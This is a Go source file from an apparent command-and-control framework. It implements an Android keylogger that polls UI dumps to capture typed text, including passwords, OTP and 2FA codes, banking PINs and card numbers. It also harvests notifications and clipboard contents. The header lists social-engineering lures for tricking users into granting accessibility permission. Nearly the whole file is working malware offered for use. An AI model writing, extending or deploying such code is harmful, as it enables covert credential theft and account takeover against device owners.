// //go:build android

package collection

/*
	SUDOSOC-C2 — Android Accessibility Service Keylogger
	Copyright (C) 2026  sudosoc — Seif

	Android's Accessibility Service API gives apps permission to:
	  • Monitor all text input events (TYPE_VIEW_TEXT_CHANGED)
	  • Read content of any window on screen
	  • Intercept any gesture or keyboard input
	  • Read text from notifications

	This is used by legitimate assistive technology but is equally
	powerful for keylogging. After the permission is granted ONCE
	by the user (social engineered as "text enlargement" or "assistant"),
	it persists across reboots.

	What gets captured:
	  ✅ All typed text (including passwords)
	  ✅ OTP codes from SMS apps
	  ✅ Banking PINs and passwords
	  ✅ 2FA tokens
	  ✅ Search queries
	  ✅ Credit card numbers (if typed into browser)
	  ✅ Clipboard content (via AccessibilityNodeInfo)
	  ✅ Notification content (email subjects, message previews)

	Social engineering lures:
	  • "Enable Accessibility for better text readability"
	  • "Grant permission for voice assistant features"
	  • "Required for battery optimization"

	Technical implementation:
	  The AccessibilityService is an Android Service component.
	  In a real APK, this would be declared in AndroidManifest.xml.
	  Here we implement the logic that runs inside the service.
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

// KeylogEntry represents a single keylog event
type KeylogEntry struct {
	Timestamp   time.Time
	App         string    // package name of the app
	FieldType   FieldType // password, text, email, etc.
	Content     string    // typed content
	Source      string    // view ID or description
	IsPassword  bool
	IsOTP       bool      // detected as OTP/2FA code
	IsSensitive bool      // credit card, SSN, etc.
}

// FieldType represents the type of input field
type FieldType int

const (
	FieldText     FieldType = iota
	FieldPassword FieldType = iota
	FieldEmail    FieldType = iota
	FieldPhone    FieldType = iota
	FieldNumber   FieldType = iota
	FieldSearch   FieldType = iota
)

// KeylogStore manages the keylog database
type KeylogStore struct {
	mu          sync.Mutex
	entries     []KeylogEntry
	outputFile  string
	maxEntries  int
}

var (
	// Regex patterns for detecting sensitive content
	otpPattern     = regexp.MustCompile(`^\d{4,8}$`)
	ccPattern      = regexp.MustCompile(`\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`)
	emailPattern   = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
	phonePattern   = regexp.MustCompile(`[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}`)
)

// NewKeylogStore creates a new keylog store
func NewKeylogStore(outputDir string) *KeylogStore {
	os.MkdirAll(outputDir, 0700)
	return &KeylogStore{
		outputFile: filepath.Join(outputDir, "keylog.txt"),
		maxEntries: 10000,
	}
}

// RecordEvent processes and stores a keylog event
func (k *KeylogStore) RecordEvent(app, text, fieldHint string, isPassword bool) {
	if text == "" || len(text) < 1 {
		return
	}

	entry := KeylogEntry{
		Timestamp:  time.Now(),
		App:        app,
		Content:    text,
		Source:     fieldHint,
		IsPassword: isPassword,
	}

	// Detect sensitive content
	if otpPattern.MatchString(strings.TrimSpace(text)) {
		entry.IsOTP = true
		entry.IsSensitive = true
	}
	if ccPattern.MatchString(text) {
		entry.IsSensitive = true
	}

	// Classify field type
	hint := strings.ToLower(fieldHint)
	switch {
	case isPassword || strings.Contains(hint, "password") || strings.Contains(hint, "pin"):
		entry.FieldType = FieldPassword
		entry.IsPassword = true
		entry.IsSensitive = true
	case strings.Contains(hint, "email"):
		entry.FieldType = FieldEmail
	case strings.Contains(hint, "phone"):
		entry.FieldType = FieldPhone
	case strings.Contains(hint, "search"):
		entry.FieldType = FieldSearch
	}

	k.mu.Lock()
	defer k.mu.Unlock()

	k.entries = append(k.entries, entry)

	// Rotate if too many entries
	if len(k.entries) > k.maxEntries {
		k.entries = k.entries[k.maxEntries/2:]
	}

	// Write to file immediately
	k.writeEntry(entry)
}

func (k *KeylogStore) writeEntry(e KeylogEntry) {
	f, err := os.OpenFile(k.outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	sensitiveFlag := ""
	if e.IsPassword {
		sensitiveFlag = " [PASSWORD]"
	}
	if e.IsOTP {
		sensitiveFlag += " [OTP/2FA]"
	}
	if e.IsSensitive && !e.IsPassword && !e.IsOTP {
		sensitiveFlag += " [SENSITIVE]"
	}

	line := fmt.Sprintf("[%s] [%s]%s: %s\n",
		e.Timestamp.Format("2006-01-02 15:04:05"),
		e.App,
		sensitiveFlag,
		e.Content)
	f.WriteString(line)
}

// GetSensitiveEntries returns only high-value entries
func (k *KeylogStore) GetSensitiveEntries() []KeylogEntry {
	k.mu.Lock()
	defer k.mu.Unlock()

	var sensitive []KeylogEntry
	for _, e := range k.entries {
		if e.IsSensitive || e.IsPassword || e.IsOTP {
			sensitive = append(sensitive, e)
		}
	}
	return sensitive
}

// GetAllContent returns all logged text
func (k *KeylogStore) GetAllContent() string {
	if data, err := os.ReadFile(k.outputFile); err == nil {
		return string(data)
	}
	return ""
}

// ── Accessibility Event Monitor ────────────────────────────────────

// AccessibilityMonitor monitors UI events via Android Accessibility APIs
// This runs as part of the AccessibilityService implementation
type AccessibilityMonitor struct {
	store      *KeylogStore
	running    bool
	stopCh     chan struct{}
	appFilter  []string // only monitor these apps (empty = all)
}

// NewAccessibilityMonitor creates a new UI monitor
func NewAccessibilityMonitor(store *KeylogStore) *AccessibilityMonitor {
	return &AccessibilityMonitor{
		store:  store,
		stopCh: make(chan struct{}),
	}
}

// Start begins monitoring UI events
// Note: In production, this would be called from the AccessibilityService.onAccessibilityEvent()
// Here we implement the shell-based fallback using Android's UI automator
func (m *AccessibilityMonitor) Start() {
	m.running = true
	go m.monitorLoop()
}

// Stop stops the monitor
func (m *AccessibilityMonitor) Stop() {
	m.running = false
	close(m.stopCh)
}

func (m *AccessibilityMonitor) monitorLoop() {
	// Method 1: Use uiautomator dump to capture current UI text
	// This periodically dumps the UI hierarchy and extracts text
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	var lastFocusedApp string
	var lastText string

	for {
		select {
		case <-m.stopCh:
			return
		case <-ticker.C:
			// Get currently focused app
			app := getFocusedApp()
			if app == "" {
				continue
			}

			if len(m.appFilter) > 0 && !contains(m.appFilter, app) {
				continue
			}

			// Dump UI hierarchy and extract text from focused field
			text, fieldType := extractFocusedFieldText()
			if text != "" && text != lastText {
				isPassword := fieldType == "password"
				m.store.RecordEvent(app, text, fieldType, isPassword)
				lastText = text
			}

			if app != lastFocusedApp {
				lastFocusedApp = app
				lastText = ""
			}
		}
	}
}

// getFocusedApp returns the package name of the currently active app
func getFocusedApp() string {
	// Android dumpsys gives us the focused window
	out, err := exec.Command("dumpsys", "window", "windows").Output()
	if err != nil {
		return ""
	}

	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "mCurrentFocus") || strings.Contains(line, "mFocusedApp") {
			parts := strings.Fields(line)
			for _, p := range parts {
				if strings.Contains(p, "/") {
					return strings.Split(p, "/")[0]
				}
			}
		}
	}
	return ""
}

// extractFocusedFieldText dumps UI and finds text in focused input fields
func extractFocusedFieldText() (string, string) {
	// Use uiautomator to dump the current window layout
	tmpFile := "/data/local/tmp/uidump.xml"
	exec.Command("uiautomator", "dump", tmpFile).Run()

	data, err := os.ReadFile(tmpFile)
	os.Remove(tmpFile)
	if err != nil {
		return "", ""
	}

	content := string(data)

	// Find focused input node
	// <node ... focused="true" ... text="..." ... class="android.widget.EditText" />
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		if strings.Contains(line, `focused="true"`) &&
			strings.Contains(line, "EditText") {

			text := extractXMLAttr(line, "text")
			hint := extractXMLAttr(line, "content-desc")

			// Determine if it's a password field
			fieldType := "text"
			if strings.Contains(line, `password="true"`) {
				fieldType = "password"
			} else if strings.Contains(strings.ToLower(hint), "password") {
				fieldType = "password"
			}

			return text, fieldType
		}
	}
	return "", ""
}

// ExtractNotifications reads notification content (useful for OTP codes)
func ExtractNotifications() []string {
	out, err := exec.Command("dumpsys", "notification").Output()
	if err != nil {
		return nil
	}

	var notifications []string
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, "content=") || strings.Contains(line, "text=") {
			notifications = append(notifications, strings.TrimSpace(line))
		}
	}
	return notifications
}

// ExtractClipboard reads current clipboard content
func ExtractClipboard() string {
	out, err := exec.Command("cmd", "clipboard", "get").Output()
	if err != nil {
		// Alternative via content provider
		out2, err2 := exec.Command("content", "query",
			"--uri", "content://clipboard").Output()
		if err2 != nil {
			return ""
		}
		return string(out2)
	}
	return string(out)
}

// CheckAccessibilityPermission checks if our app has accessibility access
func CheckAccessibilityPermission(packageName string) bool {
	out, err := exec.Command("settings", "get", "secure",
		"enabled_accessibility_services").Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), packageName)
}

// RequestAccessibilityPermission launches the accessibility settings page
// (user must manually enable — or we use social engineering)
func RequestAccessibilityPermission() {
	exec.Command("am", "start",
		"-a", "android.settings.ACCESSIBILITY_SETTINGS").Run()
}

// ── Helpers ──────────────────────────────────────────────────────

func extractXMLAttr(xml, attr string) string {
	marker := attr + `="`
	idx := strings.Index(xml, marker)
	if idx == -1 {
		return ""
	}
	start := idx + len(marker)
	end := strings.Index(xml[start:], `"`)
	if end == -1 {
		return ""
	}
	return xml[start : start+end]
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
